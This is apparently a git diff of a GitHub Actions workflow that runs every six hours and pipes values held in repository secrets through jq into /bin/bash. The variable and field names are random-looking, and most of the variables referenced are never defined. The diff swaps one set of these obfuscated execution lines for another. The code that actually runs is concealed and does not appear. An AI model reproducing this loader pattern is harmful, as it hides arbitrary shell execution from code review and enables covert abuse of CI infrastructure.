@@ -1,8 +1,9 @@
 name: laojiangzhongzheng
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 5/6 * * *'
+    - cron: '21 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,25 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: laojiangzhongzheng
         env:
-          jo6: ${{ secrets.jo6 }}
+          suu02: ${{ secrets.suu02 }}
         run: |
-          echo $jo6 | jq -r .ugswq12 | /bin/bash
-          echo $taweo054 | jq -r .ipj33885 | /bin/bash
-          echo $qiv55845 | jq -r .r13290 | /bin/bash
-          echo $kk9 | jq -r .wiblg4 | /bin/bash
-          echo $alns156 | jq -r .rcb41938 | /bin/bash
-          echo $gbsf1 | jq -r .mjrj98 | /bin/bash
-          echo $rc6637 | jq -r .wcbmb2 | /bin/bash
-          echo $wly8 | jq -r .kcpsw8 | /bin/bash
-          echo $t5953 | jq -r .vhf3 | /bin/bash
-          echo $ma67611 | jq -r .pbp40672 | /bin/bash
-          echo $b640 | jq -r .olp3 | /bin/bash
-          echo $va4520 | jq -r .fva3 | /bin/bash
-          echo $ax78 | jq -r .mkavg4 | /bin/bash
-          echo $y5402 | jq -r .n3801 | /bin/bash
-          echo $akimd4 | jq -r .f3627 | /bin/bash
-          echo $xgu5 | jq -r .epi0 | /bin/bash
-          echo $cysav31 | jq -r .zlisl4603 | /bin/bash
-          echo $a4930 | jq -r .hf150 | /bin/bash
-          echo $rtjjv120 | jq -r .iv8 | /bin/bash
+          echo $suu02 | jq -r .oape537 | /bin/bash
+          echo $bbt4 | jq -r .kbt49723 | /bin/bash
+          echo $bluri91474 | jq -r .tczlp446 | /bin/bash
+          echo $gokm96 | jq -r .skrtd5 | /bin/bash
+          echo $d786 | jq -r .js91371 | /bin/bash
+          echo $qjj38602 | jq -r .fcskb8 | /bin/bash
 
